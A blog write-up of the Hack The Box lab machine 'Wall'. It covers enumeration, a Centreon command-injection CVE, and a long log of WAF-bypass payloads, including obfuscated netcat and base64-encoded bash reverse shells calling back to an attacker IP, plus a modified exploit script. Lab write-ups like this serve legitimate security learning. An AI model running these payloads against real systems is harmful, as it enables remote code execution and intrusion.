---
layout: post
title: "Wall Writeup"
dat: 2019-07-15
categories: jekyll update
---

## Introduction

![Wall](/asset/images/wall/Wall.png)

Today Wall retired, its both my and Trump's favourite box, it involves bypassing a WebAppFirewall to exploit a CVE in an open source network manager.
Its my first HTB writeup, not used to blogging, its an attempt on work on it.
Lets hack the box:
```bash
echo "10.10.10.157	box" >> /etc/hosts
```

## Port Enumeration
Lets start with a classic nmap scan:
```bash
Nmap 7.80 scan initiated Thu Nov 21 03:19:36 2019 as: nmap -sC -sV -oA box box
Nmap scan report for box (10.10.10.157)
Host is up (0.063s latency).
rDNS record for 10.10.10.157: Wall.htb
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Thu Nov 21 03:19:59 2019 -- 1 IP address (1 host up) scanned in 23.56 seconds

```
Nothing intresting so far, higher lever ports are closed, so I presume most of the work will be on the web service.
# Web Enumeration
Root URI give us default apache.
![Apache Default](/asset/images/wall/Apache.png)
lets check for more.
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
-u http://box:80 -o gobust.box && cat gobust.box
/aa.php (Status: 200)
prints "1"
/monitoring (Status: 401)
Intresting admin panel
/panel.php (Status: 200)
prints "Just a test for php file !"
/server-status (Status: 403)
Forbidden
```
From there, was a bit lost tbh, tried to naturaly bruteforce the panel with hydra, nothing pops up, enumerate more but nothing standed out, its the part I disliked the most of this box but had to check the forum, and from there, I knew I had to change the request method to one of the gobust result, doing a POST request to /monitoring with burp:

![Fuzzing  /monitoring](/asset/images/wall/Monitoring_Post.png)
A bit CTFy but its fine, at least its not the whole box.
From there we get a new URL, /centreon, its an open source centralised system to monoitor network infrastructure, and we faced its login API.
![Centreon Login](/asset/images/wall/Centreon_Login.png)
Immediatly googled the version, and the first link is a CVE-2019-13024, where the author of the post is also the author of the box [@askar](https://twitter.com/mohammadaskar2), from there I knew I was going to the right direction, If you need more detail about the CVE, I invite you to visit his excellent [article](https://twitter.com/mohammadaskar2)  which detail the process of finding the vulnerability and exploit it.


The Exploit requires to have the credentials, so after several attempts at manual fuzzing for the password field, we get admin:password1 and we are in.


Reading the article, we conclude that one field in the pollers section of the centreon web interface is injecting code.

![Reverse shell attempt on poller section form](/asset/images/wall/Attempt_NC.png)

So after an attempt to spawn a reverse shell we get a Forbidden.

![Hit the wall](/asset/images/wall/forbidden.png)

Wanted to be sure we were facing a WAF, so used a tool to detect them, by sending requests to trigger blacklisted words.

![wafw00f on /](/asset/images/wall/WafWoof1.png)

![wafw00f on /centreon](/asset/images/wall/WafWoof2.png)

I found that curious that the Waf works only on the centreon URL, makes me think that the admin knew about the CVE and decided to put a WAF to protect it from exploitation, hopefully its a temporary mitigation.

So our goal now is to bypass that WAF, How? first enumerate what triggers it, modified the [exploit](https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py) so I could send payload from the command line, and be able to quickly test multiple entries and keep track of the results on a file.


Here are the modifications:
```bash
root@Zakali~/ROOTED/Wall# diff centreon-exploit.py. modified_exploit.py
23c23
<     print("[~] Usage : ./centreon-exploit.py url username password ip port")
---
>     print("[~] Usage : ./centreon-exploit.py url username password payload")
29,31d28
< ip = sys.argv[4]
< port = sys.argv[5]
< 
32a30
> payload = sys.argv[4]
55c53
<     poller_soup = BeautifulSoup(poller_html)
---
>     poller_soup = BeautifulSoup(poller_html,features="lxml")
69c67
<         "nagios_bin": "ncat -e /bin/bash {0} {1} #".format(ip, port),
---
>         "nagios_bin": payload,
83,84d80
< 
< 
86d81
< 
89,90c84,93
<     print("[+] Check you netcat listener !")
---
>     print(send_payload.text)
>     with  open("WAF_blacklist","a") as f: 
>         f.write("\n" +payload+"  ")
>         if "403 Forbidden" in send_payload.text :
>             print(" WAF WAF!")
>             f.write("Blacklisted.")
>         else :
>             print(" Bypassed WAF")
>             f.write("Bypassed")
96,97c99,103
<     request.post(generate_xml_page, xml_page_data)
< 
---
>     # Last post always pass the WAF
>     Resp=(request.post(generate_xml_page, xml_page_data).text)
>     print(Resp)
>     a=BeautifulSoup(Resp,features="lxml")
>     print(a.findAll(id="debug_1")[0].text)
```

So now every attempt is stored in WAF_blacklist file, before manual fuzzing, wanted to let something run on the background, wanted to see what binaries I will be able to access.
So I naively tried every binary I had.

```bash
ls /usr/bin/ | xargs -i bash -c "./modified_exploit.py admin password1 '{}'" &
```

The result was the only binary blacklisted was nc, space character too.

Here is the list of attempts, until you could see, in the end the final solution for a good payload obfuscation that ultimately spawned a shell.
First attempts was playing with variables, unfortunatly I discovered later that you could see the output of your payload, the box had the patched nc version that removes the -e option.

```bash
S=${IFS};I=10.10.14.112;P=1234;N=ncat;$N$S$I$S$P  Bypassed
S=${IFS};I=10.10.14.112;P=1234;N=ncat;$N$S$I$S$P  Bypassed
S=${IFS};I=10.10.14.112;P=1234;N=necat;$N$S$I$S$P  Bypassed
S=${IFS};I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P  Bypassed
S=${IFS};I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P  Bypassed
S=${IFS};I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P;yes  Bypassed
$(S=${IFS};I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P;yes)  Bypassed
$(S=${IFS};I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P;yes)  Bypassed
$(S=${IFS};D=-e;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$D$S/bin/bash;yes)  Bypassed
$(S=${IFS};D=-e;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$D$S/bin/bash;yes)  Bypassed
$(S=${IFS};I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P;yes)  Bypassed
/bin/bash  Bypassed
/bin/bash   Blacklisted.
$(S=${IFS};I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P;yes)  Bypassed
$(S=${IFS};I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P;yes)  Bypassed
$(S=${IFS};I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P;yes)  Bypassed
$(S=${IFS};B=/bin/bash;D=-e;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$D$S$B;yes)  Bypassed
$(S=${IFS};B=/bin/bash;D=-e;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$D$S$B;yes)  Bypassed
$(S= 	
;B=/bin/b;AS=ash;D=-e;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$D$S$B$AS;yes)  Blacklisted.
$(S=${IFS};B=/bin/b;AS=ash;D=-e;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$D$S$B$AS;yes)  Bypassed
$(S=${IFS};B=/bin/b;AS=ash;D=-e;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$D$S$B$AS;yes)  Bypassed
$(S=${IFS};B=/bin/b;AS=ash;D=-e;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$D$S$B$AS)  Bypassed
$(S=${IFS};B=/bin/b;AS=ash;D=-e;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$D$S$B$AS)  Bypassed
$(S=${IFS};B=/bin/b;AS=ash;D=-e;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$D$S$B$AS)  Bypassed
$(S=${IFS};I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P;yes)  Bypassed
$(S=${IFS};B=/bin/b;AS=ash;D=-e;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$D$S$B$AS)  Bypassed
S=${IFS};B=/bin/b;AS=ash;D=-e;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$D$S$B$AS  Bypassed
S=${IFS};B=/bin/b;AS=ash;D=-e;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$D$S$B$AS  Bypassed
$(S=${IFS};B=/bin/b;AS=ash;D=-e;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$D$S$B$AS;yes)  Bypassed
$(S=${IFS};I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P)  Bypassed
S=${IFS};I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P  Bypassed
S=${IFS};D=-e;B=/bin/bash;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P  Bypassed
S=${IFS};D=-e;B=/bin/sh;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P  Bypassed
S=${IFS};D=-e;B=/bin/sh;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$D$S$B  Bypassed
S=${IFS};D=-e;B=/bin/sh;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$D$S  Bypassed
S=${IFS};D=-e;B=/bin/sh;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$D$S  Bypassed
S=${IFS};D=-e;B=/bin/sh;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=/bin/sh;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S<  Bypassed
S=${IFS};D=-e;E=echo;B=/bin/sh;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S<  Bypassed
S=${IFS};D=-e;E=echo;B=/bin/sh;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S<  Bypassed
S=${IFS};D=-e;E=echo;B=/bin/sh;I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P$S$E$S$B  Bypassed
S=${IFS};D=-e;E=echo;B=/bin/sh;I=10.10.14.112;P=1234;N=netcat;$E$S$B$S|$S$N$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=/bin/sh;I=10.10.14.112;P=1234;N=netcat;$E$S$B$S|$S$N$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=/bin/sh;I=10.10.14.112;P=1234;N=netcat;$E$S$D$S|$S$N$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=/bin/sh;I=10.10.14.112;P=1234;N=netcat;$E$S$D$S|$S$N$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=/bin/sh;I=10.10.14.112;P=1234;N=netcat;$S$N$S$D$S$B$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=/bin/sh;I=10.10.14.112;P=1234;N=netcat;$S$N$S$D$S$B$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=/bin/sh;I=10.10.14.112;P=1234;N=netcat;$S$N$S$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=sh;I=10.10.14.112;P=1234;N=netcat;$S$N$S$D$S$B$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=sh;I=10.10.14.112;P=1234;N=netcat;$S$N$S$D$S$B$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=bash;I=10.10.14.112;P=1234;N=netcat;$S$N$S$D$S$B$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=bash;I=10.10.14.112;P=1234;N=netcat;$S$N$S$D$S$B$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=bash;I=10.10.14.112;P=1234;N=netcat;$S$N$S$D$S$B$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=bash;I=10.10.14.112;P=1234;N=netcat;$S$N$S$D$S$B$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=bash;I=10.10.14.112;P=1234;N=nc;$S$N$S$D$S$B$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=bash;I=10.10.14.112;P=1234;N=nc.traditional;$S$N$S$D$S$B$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=bash;I=10.10.14.112;P=1234;N=nc.traditional;$S$N$S$D$S$B$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=bash;I=10.10.14.112;P=1234;N=ncat.traditional;$S$N$S$D$S$B$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=bash;I=10.10.14.112;P=1234;N=ncat;$S$N$S$D$S$B$S$I$S$P$S  Bypassed
S=${IFS};D=-i;E=echo;B=bash;I=10.10.14.112;P=1234;/bin/$B$S$D>&/dev/tcp/$I/$P$S0>&1  Bypassed
S=${IFS};D=-i;E=echo;B=bash;I=10.10.14.112;P=1234;/bin/$B$S$D>&/dev/tcp/$I/$P$S0>&1  Bypassed
S=${IFS};D=-i;E=echo;B=bash;I=10.10.14.112;P=1234;L=0>&1;/bin/$B$S$D>&/dev/tcp/$I/$P$S$L  Bypassed
S=${IFS};D=-i;E=echo;B=bash;I=10.10.14.112;P=1234;L=0>&1;/bin/$B$S$D>&$S/dev/tcp/$I/$P/$S$L  Bypassed
S=${IFS};D=-i;E=echo;B=bash;I=10.10.14.112;P=1234;python  Bypassed
S=${IFS};D=-i;E=echo;B=bash;I=10.10.14.112;P=1234;ls  Bypassed
S=${IFS};D=-i;E=echo;B=bash;I=10.10.14.112;P=1234;whoami  Bypassed
whoami  Bypassed
whoami\\   Blacklisted.
whoami  Bypassed
S=${IFS};D=-i;E=echo;B=bash;I=10.10.14.112;P=1234;ls  Bypassed
S=${IFS};D=-i;E=echo;B=bash;I=10.10.14.112;P=1234;F=/usr/local/centreon/filesGeneration/engine/1/centengine.DEBUG;cat 	
  Blacklisted.
S=${IFS};D=-i;E=echo;B=bash;I=10.10.14.112;P=1234;$B$S$D$S/dev/tcp/10.10.14.112/1234 0>&1  Blacklisted.
S=${IFS};D=-i;E=echo;B=bash;I=10.10.14.112;P=1234;$B$S$D$S/dev/tcp/10.10.14.112/1234$S0>&1  Bypassed
S=${IFS};D=-i;E=echo;B=bash;I=10.10.14.112;P=1234;L=0>&1;$B$S$D$S/dev/tcp/10.10.14.112/1234$S$L  Bypassed
S=${IFS};D=-i;E=echo;B=bash;I=10.10.14.112;P=1234;socat  Bypassed
S=${IFS};D=-i;E=echo;B=bash;I=10.10.14.112;P=1234;socat$S--help  Bypassed
S=${IFS};D=-i;E=echo;B=bash;I=10.10.14.112;P=1234;python  Bypassed
S=${IFS};D=-e;E=echo;B=bash;I=10.10.14.112;P=1234;N=ncat.traditional;$S$N$S$D$S$B$S$I$S$P$S  Bypassed
S=${IFS};D=-e;E=echo;B=bash;I=10.10.14.112;P=1234;N=netcat;$S$N$S$D$S$B$S$I$S$P$S  Bypassed
S=${IFS};P=YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTIvMTIzNCAwPiYxCg==;D=-d;B=bash;echo${IFS}$P|base64$S$D|$B  Bypassed
$(S=${IFS};P=YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTIvMTIzNCAwPiYxCg==;D=-d;B=bash;echo${IFS}$P|base64$S$D|$B)  Bypassed
bash  Bypassed
bash&&/usr/bin/centengin  Bypassed
&& $(S=${IFS};P=YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTIvMTIzNCAwPiYxCg==;D=-d;B=bash;echo${IFS}$P|base64$S$D|$B)  Blacklisted.
;$(S=${IFS};P=YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTIvMTIzNCAwPiYxCg==;D=-d;B=bash;echo${IFS}$P|base64$S$D|$B)  Bypassed
$(S=${IFS};P=YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTIvMTIzNCAwPiYxCg==;D=-d;B=bash;echo${IFS}$P|base64$S$D|$B  Bypassed
$(S=${IFS};I=10.10.14.112;P=1234;N=netcat;$N$S$I$S$P;yes)  Bypassed
a  Bypassed
whoami  Bypassed
$(S=${IFS};P=YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTIvMTIzNCAwPiYxCg==;D=-d;B=bash;echo${IFS}$P|base64$S$D|$B  Bypassed
====> Spawned a Shell!!
$(S=${IFS};P=YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTIvMTIzNCAwPiYxCg==;D=-d;B=bash;echo${IFS}$P|base64$S$D|$B)  Bypassed
$(S=${IFS};P=YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTIvMTIzNCAwPiYxCg==;D=-d;B=bash;echo${IFS}$P|base64$S$D|$B)  Bypassed
$(S=${IFS};P=YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTIvMTIzNCAwPiYxCg==;D=-d;B=bash;echo${IFS}$P|base64$S$D|$B)  Bypassed
$(S=${IFS};P=YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTIvMTIzNCAwPiYxCg==;D=-d;B=bash;echo${IFS}$P|base64$S$D|$B)  Bypassed
$(S=${IFS};P=YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTIvMTIzNCAwPiYxCg==;D=-d;B=bash;echo${IFS}$P|base64$S$D|$B)  Bypassed
$(S=${IFS};P=YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTIvMTIzNCAwPiYxCg==;D=-d;B=bash;echo${IFS}$P|base64$S$D|$B)  Bypassed
```

As you can see, the best payload was base64 encoding a bash reverse shell, and using variables to store every part of the command, and using the bash ${IFS} variable that outputs a space character, thanks to this [article about IFS](https://bash.cyberciti.biz/guide/$IFS) 

Its may be not the best payload, but its working, I'm not complaining!

From there we get a shell as www-data, after some enumeration we find an outdated screen binary, the [exploit](https://github.com/XiphosResearch/exploits/tree/master/screen2root) gives insta root.

# Conclusion

Thanks @askar for your article, learned alot. WAF bypassing was fun, had huge dopamine rush when the shell popped.

Patch your web apps, dont relay on WAFS to protect you from vulnerabilities, WAF is not a complete security feature, its just complementary, it slows down potential attacks and notify you at best.
